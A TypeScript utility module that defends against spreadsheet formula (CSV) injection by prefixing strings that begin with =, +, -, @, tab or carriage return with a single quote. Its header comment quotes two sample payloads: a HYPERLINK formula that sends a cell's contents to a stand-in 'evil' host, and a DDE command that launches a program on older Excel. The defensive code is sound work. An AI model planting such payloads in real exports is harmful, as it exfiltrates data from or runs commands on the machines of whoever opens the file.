// src/utils/spreadsheet-safe.ts — neutralise spreadsheet FORMULA INJECTION ("CSV injection").
//
// A cell whose text starts with `=`, `+`, `-` or `@` — or with a TAB or CARRIAGE RETURN, which
// spreadsheet apps strip before re-reading the next character — is evaluated as a formula when the
// file is opened in Excel / LibreOffice / Sheets. `=HYPERLINK("https://evil/?"&A1,"Open")` exfiltrates
// a neighbouring cell on click; DDE payloads (`=cmd|' /C calc'!A0`) ran code on older Excel.
//
// The neutralisation is the OWASP one: prefix the text with a single quote, which every spreadsheet
// app treats as "this is text" and does not display. Applied:
//   • ON STORE for member uploads (routes/information-requests.ts) — a member's file can reach an
//     approver's spreadsheet later (records → dataset prefill → any future export), so the value is
//     made safe once, at rest, instead of trusting every future exporter to remember;
//   • in the one CSV export the product has (`GET /api/audit/export.csv`), whose `target_id` and
//     `result` cells carry member-typed names (a request's or dataset's name).
// Only STRINGS are touched: a typed number (-5) is not text and is not a formula.

const FORMULA_START = /^[=+\-@\t\r]/;

/** The text, made inert for a spreadsheet: a leading `'` when it would start a formula. */
export function neutralizeFormula(text: string): string {
  return FORMULA_START.test(text) ? `'${text}` : text;
}

/** One cell value: strings are neutralised, every other type passes unchanged. */
export function neutralizeCell(value: unknown): unknown {
  return typeof value === 'string' ? neutralizeFormula(value) : value;
}

/** Every cell of one row. Returns the SAME object when nothing changed. */
export function neutralizeRow(row: Record<string, unknown>): Record<string, unknown> {
  let out: Record<string, unknown> | null = null;
  for (const [k, v] of Object.entries(row)) {
    const next = neutralizeCell(v);
    if (next !== v) {
      out ??= { ...row };
      out[k] = next;
    }
  }
  return out ?? row;
}
